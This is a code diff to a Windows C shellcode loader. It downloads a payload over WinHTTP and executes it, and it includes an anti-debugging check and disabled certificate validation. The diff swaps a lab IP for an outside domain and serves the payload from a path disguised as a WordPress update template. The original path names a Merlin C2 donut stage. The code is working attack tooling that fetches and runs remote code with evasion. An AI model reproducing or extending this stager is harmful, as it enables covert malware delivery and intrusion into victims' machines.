@@ -10,7 +10,7 @@
 #pragma comment(lib, "winhttp.lib")
 //#pragma comment(lib, "ntdll")
 
-unsigned char buf[11628628];
+unsigned char buf[11876097];
 
 
 
@@ -304,7 +304,7 @@ VOID SharedSleep(IN ULONG64 uMilliseconds) {
 }
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
-void dl(const wchar_t* host, short port)
+void dl(const wchar_t* host, const wchar_t* path , short port)
 {
 	if (ChekDebug()) {
 		return ;
@@ -334,8 +334,9 @@ void dl(const wchar_t* host, short port)
 	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
 
 	// Create an HTTP request handle.
+	// the last parameter of the WinHttpOpenRequest() function should be WINHTTP_FLAG_SECURE if using https and 0 if http 
 	if (hConnect)
-		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/merlin_s1_donut.bin", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+		hRequest = WinHttpOpenRequest(hConnect, L"GET", path ,NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
 
 	// This is for accepting self signed Cert
 	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
@@ -564,7 +565,8 @@ int main()
 		myprintf("\nFailed to initialize bokemon \n");
 		return -1;
 	}
-	dl(L"192.168.90.21", (short)80);
+	//dl(L"192.168.90.21", (short)80);
+	dl(L"pybase.com", L"/wp-content/help/Update_v1.2_express_fixes.template", 443);
 	Exec();
 	return 0;
 }
